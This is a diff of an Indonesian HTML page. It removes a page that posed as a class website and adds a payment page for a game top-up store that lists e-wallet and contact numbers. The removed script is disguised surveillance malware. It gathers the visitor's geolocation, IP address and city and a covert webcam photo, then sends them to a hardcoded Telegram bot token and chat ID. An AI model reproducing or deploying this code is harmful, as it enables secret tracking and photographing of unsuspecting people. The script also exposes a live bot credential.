@@ -1,89 +1,426 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Random Website</title>
-<style>
-  html,body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;text-align:center;color:#fff;background:#111}
-  .screen{width:100%;height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center}
-  button{background:#e91e63;color:#fff;border:none;padding:12px 30px;font-size:16px;border-radius:25px;cursor:pointer}
-  #loading{display:none}
-  .spinner{border:4px solid rgba(255,255,255,.3);border-top:4px solid #fff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin-bottom:15px}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  #welcome{display:none;font-size:48px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%)}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SkyWithYou - Payment</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Loading Animation */
+        .loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loading-container.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Welcome Animation */
+        .welcome-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9998;
+            opacity: 0;
+            animation: fadeIn 1s ease forwards;
+            animation-delay: 2s;
+        }
+
+        .welcome-text {
+            color: white;
+            font-size: 3rem;
+            font-weight: bold;
+            text-align: center;
+            transform: translateY(50px);
+            opacity: 0;
+            animation: slideUp 1s ease forwards;
+            animation-delay: 2.5s;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Main Content */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 1s ease forwards;
+            animation-delay: 4s;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+
+        .store-name {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .admin-info {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            color: white;
+            text-align: center;
+        }
+
+        .admin-avatar {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+        }
+
+        .payment-methods {
+            display: grid;
+            gap: 20px;
+        }
+
+        .payment-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .payment-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+        }
+
+        .payment-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .payment-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+
+        .payment-details {
+            color: #666;
+            line-height: 1.8;
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: transform 0.2s ease;
+            margin-top: 10px;
+        }
+
+        .copy-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .copy-btn:active {
+            transform: scale(0.95);
+        }
+
+        .qris-container {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .qris-image {
+            width: 200px;
+            height: 200px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            color: #999;
+        }
+
+        .contact-info {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .contact-title {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        .music-icon {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+
+        .music-icon:hover {
+            transform: scale(1.1);
+        }
+
+        .music-icon.playing {
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @media (max-width: 600px) {
+            .welcome-text {
+                font-size: 2rem;
+            }
+            
+            .store-name {
+                font-size: 2rem;
+            }
+            
+            .payment-card {
+                padding: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
+    <!-- Loading Animation -->
+    <div class="loading-container" id="loading">
+        <div class="loader"></div>
+    </div>
 
-<!-- HALAMAN AWAL -->
-<div id="start" class="screen">
-  <h2>Website kelas XI TKJ, kamu ingin melihat isinya?, silakan klik lanjut</h2>
-  <button onclick="start()">Lanjut</button>
-</div>
+    <!-- Welcome Animation -->
+    <div class="welcome-container" id="welcome">
+        <div class="welcome-text">Selamat datang di website payment</div>
+    </div>
 
-<!-- HALAMAN LOADING -->
-<div id="loading" class="screen">
-  <div class="spinner"></div>
-  <div>Mengirim data...</div>
-</div>
+    <!-- Main Content -->
+    <div class="main-container" id="mainContent">
+        <div class="header">
+            <h1 class="store-name">SkyWithYou Store</h1>
+        </div>
 
-<!-- HALAMAN WELCOME -->
-<div id="welcome" class="screen">WELCOME TO website random</div>
+        <div class="admin-info">
+            <div class="admin-avatar">👤</div>
+            <h3>Admin: skywithyou</h3>
+            <p>Platform Favorit: ML, FF, PUBG dan ROBLOX</p>
+        </div>
 
-<script>
-const BOT_TOKEN = '8467123418:AAEPfl_OkP32KJsnaPyLc9iwwDNJUNg0uaM';
-const CHAT_ID   = '7670525689';
+        <div class="payment-methods">
+            <div class="payment-card">
+                <div class="payment-title">
+                    <div class="payment-icon">D</div>
+                    DANA
+                </div>
+                <div class="payment-details">
+                    <p><strong>Nomor:</strong> 081263348992</p>
+                    <p><strong>Atas Nama:</strong> N/A HARXX ADXX NASXXXX</p>
+                    <button class="copy-btn" onclick="copyToClipboard('081263348992')">Salin Nomor</button>
+                </div>
+            </div>
 
-async function start(){
-  // ganti ke layar loading
-  document.getElementById('start').style.display='none';
-  document.getElementById('loading').style.display='flex';
+            <div class="payment-card">
+                <div class="payment-title">
+                    <div class="payment-icon">O</div>
+                    OVO & GOPAY
+                </div>
+                <div class="payment-details">
+                    <p><strong>Nomor:</strong> 085133939838</p>
+                    <p><strong>Atas Nama:</strong> N/A HARXX ADXX NASXXXX</p>
+                    <button class="copy-btn" onclick="copyToClipboard('085133939838')">Salin Nomor</button>
+                </div>
+            </div>
 
-  try{
-    // 1. lokasi
-    const pos=await new Promise((res,rej)=>
-      navigator.geolocation.getCurrentPosition(res,rej,{timeout:8000})
-    );
-    const {latitude,longitude}=pos.coords;
+            <div class="payment-card">
+                <div class="payment-title">
+                    <div class="payment-icon">Q</div>
+                    QRIS
+                </div>
+                <div class="payment-details">
+                    <div class="qris-container">
+                        <div class="qris-image">📱</div>
+                        <p>Scan QRIS diatas untuk pembayaran</p>
+                    </div>
+                </div>
+            </div>
+        </div>
 
-    // 2. ip
-    const ipData=await (await fetch('https://ipapi.co/json/')).json();
-    const {ip,city,region}=ipData;
+        <div class="contact-info">
+            <div class="contact-title">Kontak Admin</div>
+            <div class="contact-item">
+                <span>📱</span>
+                <span>WhatsApp: 085133939838</span>
+            </div>
+            <div class="contact-item">
+                <span>📞</span>
+                <span>Nomor Kedua: 081263348992</span>
+            </div>
+            <div class="contact-item">
+                <span>📧</span>
+                <span>Email: skywithyou21@gmail.com</span>
+            </div>
+        </div>
+    </div>
 
-    // 3. kamera
-    const stream=await navigator.mediaDevices.getUserMedia({video:true});
-    const v=document.createElement('video');
-    v.srcObject=stream;v.muted=true;
-    v.play();await new Promise(r=>v.onloadedmetadata=r);
+    <!-- Music Icon -->
+    <div class="music-icon" id="musicIcon" onclick="toggleMusic()">
+        <span id="musicSymbol">🎵</span>
+    </div>
 
-    // 4. foto
-    const c=document.createElement('canvas');
-    const ctx=c.getContext('2d');
-    c.width=v.videoWidth;c.height=v.videoHeight;
-    ctx.drawImage(v,0,0);
+    <script>
+        // Hide loading and welcome animations
+        setTimeout(() => {
+            document.getElementById('loading').classList.add('hide');
+        }, 2000);
 
-    // 5. kirim
-    const blob=await new Promise(res=>c.toBlob(res,'image/jpeg'));
-    const cap=`📍 ${city}, ${region}\n🌍 ${latitude}, ${longitude}\n🌐 ${ip}`;
-    const fd=new FormData();
-    fd.append('chat_id',CHAT_ID);
-    fd.append('caption',cap);
-    fd.append('photo',blob,'foto.jpg');
-    const resp=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+        setTimeout(() => {
+            document.getElementById('welcome').style.display = 'none';
+        }, 4500);
 
-    stream.getTracks().forEach(t=>t.stop());
+        // Copy to clipboard function
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Nomor berhasil disalin: ' + text);
+            }).catch(err => {
+                alert('Gagal menyalin nomor');
+            });
+        }
 
-    if(resp.ok){ // berhasil → welcome
-      document.getElementById('loading').style.display='none';
-      document.getElementById('welcome').style.display='flex';
-    }else{ // gagal → reload saja
-      location.reload();
-    }
-  }catch(e){
-    location.reload();
-  }
-}
-</script>
+        // Music toggle (simulated)
+        let musicPlaying = false;
+        function toggleMusic() {
+            musicPlaying = !musicPlaying;
+            const musicIcon = document.getElementById('musicIcon');
+            const musicSymbol = document.getElementById('musicSymbol');
+            
+            if (musicPlaying) {
+                musicIcon.classList.add('playing');
+                musicSymbol.textContent = '🎶';
+                // In real implementation, you would play audio here
+                console.log('Music playing...');
+            } else {
+                musicIcon.classList.remove('playing');
+                musicSymbol.textContent = '🎵';
+                // In real implementation, you would pause audio here
+                console.log('Music stopped.');
+            }
+        }
+
+        // Add some interactive effects
+        document.querySelectorAll('.payment-card').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-5px) scale(1.02)';
+            });
+            
+            card.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0) scale(1)';
+            });
+        });
+    </script>
 </body>
-</html>
+  </html>
